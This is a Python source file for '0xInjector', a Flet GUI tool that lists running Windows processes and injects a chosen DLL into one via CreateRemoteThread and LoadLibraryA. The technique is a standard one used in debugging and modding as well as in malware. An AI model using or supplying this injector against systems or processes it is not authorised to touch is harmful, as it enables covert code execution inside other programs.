import flet as ft
from flet import FilePicker, TextField, ElevatedButton, Column, Row, Text, Dropdown, AlertDialog, ProgressBar, IconButton, icons, Checkbox
import ctypes
import os
import psutil
import time

# Function to list processes by name for easier selection
def list_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append((proc.info['pid'], proc.info['name']))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return processes

# Function to inject the DLL into a specific process
def inject_dll(pid, dll_path, wait_for_thread=True):
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x1F0FFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)

    kernel32 = ctypes.windll.kernel32
    dll_len = len(dll_path)

    # Get the handle of the process
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return f"Error obtaining process handle: {ctypes.GetLastError()}"

    # Allocate memory in the target process for the DLL
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len + 1, VIRTUAL_MEM, PAGE_READWRITE)  # Fixed: Allocate memory for null-terminator
    if not arg_address:
        kernel32.CloseHandle(h_process)  # Fixed: Close handle on failure
        return f"Error allocating memory in target process: {ctypes.GetLastError()}"

    # Write the DLL path into the allocated memory
    written = ctypes.c_int(0)
    if not kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len + 1, ctypes.byref(written)):  # Fixed: Write null-terminated string
        kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)  # Free allocated memory
        kernel32.CloseHandle(h_process)  # Fixed: Close handle on failure
        return f"Error writing to process memory: {ctypes.GetLastError()}"

    # Get the address of the LoadLibraryA function
    h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
    if not h_kernel32:
        kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)  # Fixed: Free allocated memory on failure
        kernel32.CloseHandle(h_process)  # Fixed: Close handle on failure
        return f"Error getting handle of kernel32.dll: {ctypes.GetLastError()}"

    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
    if not h_loadlib:
        kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)  # Fixed: Free allocated memory on failure
        kernel32.CloseHandle(h_process)  # Fixed: Close handle on failure
        return f"Error getting address of LoadLibraryA: {ctypes.GetLastError()}"

    # Create a remote thread that executes LoadLibraryA with the DLL path
    thread_id = ctypes.c_ulong(0)
    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id))
    if not h_thread:
        kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)  # Fixed: Free allocated memory on failure
        kernel32.CloseHandle(h_process)  # Fixed: Close handle on failure
        return f"Error creating remote thread: {ctypes.GetLastError()}"

    # Optionally wait for the remote thread to finish
    if wait_for_thread:
        ctypes.windll.kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)

    # Clean up
    kernel32.CloseHandle(h_thread)  # Fixed: Close thread handle
    kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)  # Fixed: Free allocated memory after thread execution
    kernel32.CloseHandle(h_process)  # Fixed: Close process handle

    return "DLL successfully injected!"

# Function called when clicking the "Inject DLL" button
def inject_dll_click(e):
    try:
        pid = int(pid_field.value) if pid_field.value else int(pid_dropdown.value)
        dll_path = dll_picker.result[0] if dll_picker.result else None
        wait_for_thread = wait_for_thread_checkbox.value
        if not dll_path or not os.path.isfile(dll_path):
            result_text.value = "Invalid DLL path."
        else:
            progress_bar.visible = True
            e.page.update()
            time.sleep(1)  # Simulate some delay for a better UX
            result = inject_dll(pid, dll_path, wait_for_thread)
            result_text.value = result
            progress_bar.visible = False
    except ValueError:
        result_text.value = "Invalid PID."
    e.page.update()

# Function to refresh the process list
def refresh_process_list(e):
    processes = list_processes()
    pid_dropdown.options = [ft.dropdown.Option(text=f"{name} (PID: {pid})", key=str(pid)) for pid, name in processes]
    e.page.update()

# Function to handle DLL selection callback
def on_dll_selected(e):
    if dll_picker.result:
        dll_selected_text.value = f"Selected DLL: {dll_picker.result[0]}"
    e.page.update()

# Initialize the graphical interface with Flet
def main(page: ft.Page):
    page.title = "0xInjector"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER

    global pid_field, dll_picker, result_text, dll_selected_text, pid_dropdown, progress_bar, wait_for_thread_checkbox

    pid_field = TextField(label="Process PID (optional)", width=200)
    dll_picker = FilePicker(on_result=on_dll_selected)
    page.overlay.append(dll_picker)  # Ensure FilePicker is added to the page before using it
    pick_dll_button = ElevatedButton("Select DLL", on_click=lambda _: dll_picker.pick_files(allow_multiple=False))
    inject_button = ElevatedButton("Inject DLL", on_click=inject_dll_click)
    refresh_button = IconButton(icon=icons.REFRESH, on_click=refresh_process_list)
    result_text = Text(value="")
    dll_selected_text = Text(value="No DLL selected.")
    progress_bar = ProgressBar(width=300, visible=False)
    wait_for_thread_checkbox = Checkbox(label="Wait for Remote Thread to Finish", value=True)

    # Dropdown for selecting a process by name
    processes = list_processes()
    pid_dropdown = Dropdown(
        label="Select a Process",
        options=[ft.dropdown.Option(text=f"{name} (PID: {pid})", key=str(pid)) for pid, name in processes],
        width=300,
    )

    page.add(
        Column(
            [
                Row([pid_field], alignment=ft.MainAxisAlignment.CENTER),
                Row([pid_dropdown, refresh_button], alignment=ft.MainAxisAlignment.CENTER),
                Row([pick_dll_button, dll_selected_text], alignment=ft.MainAxisAlignment.CENTER),
                Row([wait_for_thread_checkbox], alignment=ft.MainAxisAlignment.CENTER),
                Row([inject_button], alignment=ft.MainAxisAlignment.CENTER),
                Row([progress_bar], alignment=ft.MainAxisAlignment.CENTER),
                Row([result_text], alignment=ft.MainAxisAlignment.CENTER),
            ],
            alignment=ft.MainAxisAlignment.CENTER,
        )
    )

ft.app(target=main)
